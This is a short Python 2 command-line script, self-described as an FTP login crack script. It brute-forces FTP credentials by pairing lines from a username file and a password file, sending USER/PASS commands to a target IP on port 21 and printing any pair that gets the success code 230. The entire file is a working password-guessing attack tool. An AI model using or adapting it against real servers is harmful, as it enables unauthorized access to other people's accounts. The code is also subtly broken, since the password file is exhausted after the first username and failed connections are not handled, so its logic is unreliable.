#!/usr/bin/env python
#-*-encoding:utf-8-*-

'''
    use wireshark to track the process of one sucessful ftp login
    then I find when logining successful,230 was returned
    and all other message returned by ftpserver
'''

import socket
import getopt
import sys

def usage():
    print "This is a ftp login crack script"
    print "Usage:"
    print "-t --target target IP"
    print "-u --userfile usernames in a file and every username occupies one line"
    print "-p --passwdfile passwords in a file and every password occupies one line"
    sys.exit()

def connect(target,port,username,password):

    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        sock.connect((target,port))
        data=sock.recv(1024)
        print "[+]Connected to %s: %d successfully" % (target,port)
    except:
        print "[-]Connected to %s: %d failed" % (target,port)

    username=username.strip('\n')
    password=password.strip('\n')
    sock.send("USER "+username+"\r\n")
    data=sock.recv(1024)
    sock.send("PASS "+password+"\r\n")
    data=sock.recv(1024)
    if data.startswith("230"):
        print "%s: %s login successful" % (username,password)
    else:
        print "%s: %s login failed" % (username,password)

def main():
    
    port=21

    if len(sys.argv[1:])!=6:
        usage()
    
    try:
        opts,args=getopt.getopt(sys.argv[1:],\
                                "ht:u:p:",\
                            ["help","target=","userfile=","passwdfile="])
    except:
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-t","--target"):
            target=a
        elif o in ("-u","--userfile"):
            userfile=a
        elif o in ("-p","--passwdfile"):
            passwdfile=a
        else:
            assert False,"Unhandled option"
    
    user_data=open(userfile,"r")
    passwd_data=open(passwdfile,"r")

    for username in user_data.readlines():
        for password in passwd_data.readlines():
            connect(target,port,username,password)

    user_data.close()
    passwd_data.close()
                                                        

if __name__=="__main__":
    main()
